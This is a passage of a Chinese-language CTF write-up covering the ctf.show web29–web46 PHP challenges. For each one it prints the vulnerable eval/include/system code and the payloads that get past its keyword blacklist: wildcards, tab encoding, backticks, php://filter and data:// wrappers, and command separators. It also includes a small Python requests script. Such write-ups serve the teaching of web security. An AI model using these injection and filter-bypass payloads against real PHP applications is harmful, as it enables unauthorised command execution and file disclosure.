class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了flag(无论大小写)<br><img src="https://img-blog.csdnimg.cn/2021041017052523.png" alt="在这里插入图片描述"><br>然后开始构造url</p><blockquote><p><a href="http://d21fb9a4-ae00-4ab5-89a5-21dbe59eaa19.challenge.ctf.show:8080/?c=system(%22tac%20fla*%22)">http://d21fb9a4-ae00-4ab5-89a5-21dbe59eaa19.challenge.ctf.show:8080/?c=system(%22tac%20fla*%22)</a>;</p></blockquote><p>这样子就拿到flag了！</p><h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了flag|system|php这些字符！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;echo &#96;tac *&#96;;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210410171304882.png" alt="在这里插入图片描述"></p><h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了空格！<br>可以用%09这个来代替空格！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;echo%09&#96;tac%09*&#96;;</span><br></pre></td></tr></table></figure><p>某些具有特殊意义的字符也用“%”连接对应的16进制ASCII码代替。</p><h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把反引号和echo都给过滤了！<br>可以利用include和require函数！！！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include$_POST[a]?&gt;</span><br><span class="line">post:a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><p>先是include引入一个post变量，然后让post打印出来flag！<br>然后进行base64解码！！！</p><blockquote><p>PHP 过滤器用于对来自非安全来源的数据（比如用户输入）进行验证和过滤。</p></blockquote><p>这样子flag就得到了！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://1d51fa1f-6dfe-4266-98c9-947e4b4869a0.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;a=php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.post(url+<span class="string">&#x27;?c=include$_POST[a]?&gt;&#x27;</span>,data=data)</span><br><span class="line">print(res.status_code)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>我想写个脚本来跑，但是这样子是没有办法输出结果的?不知到这么回事？</p><hr /><h1 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多过滤了双引号，继续上一个脚本！</p><p>这个脚本web32-web36通杀，下面的也可以！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">0</span>]<span class="meta">?&gt;</span>&amp;<span class="number">0</span>=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> echo(`cat flag.php`);<span class="meta">?&gt;</span></span></span><br><span class="line">或者</span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">0</span>]<span class="meta">?&gt;</span>&amp;<span class="number">0</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><hr /><h1 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多过滤一个:号，还是可以使用上一题的payload</p><hr /><h1 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多过滤一个&lt;号和一个=号，不过没有影响，继续使用前面的payload</p><hr /><h1 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次增加过滤数字，但还是没有影响，继续使用前面payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><hr /><h1 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里明显与前面不一样了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br><span class="line">或</span><br><span class="line">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;</span><br><span class="line">&#x2F;&#x2F;这个脚本需要查看源代码</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210414083303617.png" alt="在这里插入图片描述"></p><hr /><h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次在前面基础上过滤了php和file，对我们无碍，因为我们使用的是php短标签，所以继续使用上面的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;&#x2F;plain,&lt;?&#x3D;system(&quot;nl fl*&quot;);?&gt;</span><br></pre></td></tr></table></figure><p>同样需要进行检查源代码！</p><hr /><h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里继续前面的payload！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;&#x2F;plain,&lt;?&#x3D;system(&quot;tac f*&quot;)?&gt;</span><br></pre></td></tr></table></figure><hr /><h1 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ol><li>localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</li><li>pos()：返回数组中当前元素的值</li><li>scandir()：获取目录下的文件</li><li>array_reverse()：将数组逆序排列</li><li>next()：函数将内部指针指向下一元素，并输出</li><li>print_r(scandir(‘.’)); 查看当前目录下的所有文件名</li><li>current() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p>我们先打印出当前目录下的文件！<br><img src="https://img-blog.csdnimg.cn/2021041408501899.png" alt="在这里插入图片描述"></p><blockquote><ol><li>each() 返回数组中当前的键/值对并将数组指针向前移动一步</li><li>end() 将数组的内部指针指向最后一个单元</li><li>next() 将数组中的内部指针向前移动一位</li><li>prev() 将数组中的内部指针倒回一位</li><li>array_reverse() 以相反的元素顺序返回数组</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</span><br><span class="line">或</span><br><span class="line">?c&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>此时我们就需要打印出来flag了!<br><img src="https://img-blog.csdnimg.cn/20210414085623889.png" alt="在这里插入图片描述"></p><hr /><h1 id="web41-暂时未做！"><a href="#web41-暂时未做！" class="headerlink" title="web41(暂时未做！)"></a>web41(暂时未做！)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了数字和字母还有一些其他符号，但我们可以利用或运算符进行构造payload进行命令执行</p><hr /><h1 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>1：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>2：/dev/null 代表空设备文件<br>3：2&gt; 表示stderr标准错误<br>4：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1<br>5：1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于 “1&gt;/dev/null”<br>因此，&gt;/dev/null 2&gt;&amp;1 也可以写成“1&gt; /dev/null 2&gt; &amp;1”<br><br ><br>那么本文标题的语句执行过程为：<br>1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，也就是不显示任何信息。<br>2&gt;&amp;1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p></blockquote><p>这里我再来进行一波解释：<br>0表示键盘输入，1表示屏幕输出，2表示错误输出！<br>‘ &gt; ’ 默认标准输出重定向，与1&gt;相同<br>2&gt;&amp;1 意思是把标准错误输出重定向到标准输出<br>&amp;&gt;file 意思是把标准输出和标准错误输出都重定向到文件file中</p><p>而我们想要得到输出，就不能让后面的进行执行，所以可以加上截断语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac flag.php;</span><br><span class="line">或</span><br><span class="line">?c&#x3D;cat flag.php;</span><br><span class="line">cat flag.php%0a</span><br><span class="line">cat flag.php||</span><br><span class="line">cat flag.php%26</span><br><span class="line">cat flag.php%26%26</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210414092011698.png" alt="在这里插入图片描述"></p><hr /><h1 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了cat和;号，我们用其它的命令分隔符即可！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac flag.php||</span><br></pre></td></tr></table></figure><hr /><h1 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了flag,利用通配符进行绕过！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac fl*%0a</span><br><span class="line">?c&#x3D;tac fl??????%0a（？与省略的ag.php数量一致）</span><br><span class="line">?c&#x3D;tac fl&#96;&#96;ag.php||</span><br></pre></td></tr></table></figure><hr /><h1 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多加了空格，这次可以使用%09进行绕过！%09是Tab的url编码！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac%09f*||</span><br></pre></td></tr></table></figure><hr /><h1 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span 